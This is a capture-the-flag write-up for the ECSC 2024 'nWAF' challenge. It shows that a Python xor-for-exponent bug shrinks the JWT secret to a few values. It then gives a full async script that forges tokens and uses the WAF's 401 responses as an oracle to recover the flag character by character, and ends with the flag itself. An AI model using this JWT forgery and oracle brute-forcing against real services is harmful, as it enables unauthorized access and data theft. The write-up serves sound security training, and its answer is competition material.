# nWAF

> This year our WAF is even better, it won't leak any meaningful pieces of the flag!
>
> [https://nwaf.ecsc24.hack.cert.pl/](https://nwaf.ecsc24.hack.cert.pl/)
> [nwaf.py](https://hack.cert.pl/files/nwaf-ec1f9efd081f04f1d5eec99196a23532bc911ff0.py)

## Solution
From the source code:
```python
app.config["JWT_SECRET_KEY"] = random.randint(2 ^ 127, 2 ^ 128).to_bytes(16, 'big')
```

As `^` in Python is xor (not exponentiation), there are literally 6 possible values for the secret key, so we can easily find the correct one by checking all options. Now we can use the fact that `waf` will return a 401 if any 4-character substring of the flag appears in the response together with the fact that `hello` will put the username from the signed JWT token in the response to bruteforce the flag byte-by-byte:

```python
import aiohttp
import asyncio
from base64 import b64decode
import jwt
from string import printable

alphabet = printable
key = b64decode('AAAAAAAAAAAAAAAAAAAAfg==')


def token_payload(sub):
    return {
        "fresh": False,
        "iat": 1719737744,
        "jti": "2887c4d1-c024-4741-b2e1-467320b476cc",
        "type": "access",
        "sub": sub,
        "nbf": 1719737744,
        "csrf": "4fabc712-73fa-43c6-9fbf-aa0dc315e855",
        "exp": 1819957560
    }


async def is_ngram(session, ngram):
    token = jwt.encode(token_payload(ngram), key, 'HS256')
    resp = await session.get('https://nwaf.ecsc24.hack.cert.pl/hello', cookies={'access_token_cookie': token})
    return ngram, resp.status == 401


async def check_batch(ngrams):
    async with aiohttp.ClientSession() as session:
        results = await asyncio.gather(*[is_ngram(session, n) for n in ngrams])
    return [r[0] for r in results if r[1]]

flag = 'ecsc24{'

while flag[-1] != '}':
    batch = [flag[-3:] + c for c in alphabet]
    result = asyncio.run(check_batch(batch))
    if len(result) != 1:
        print(result)
        break
    flag += result[0][-1]
    print(flag)
```

## Flag
`ecsc24{mowa_jest_srebrem_a_milczenie_owiec!}`
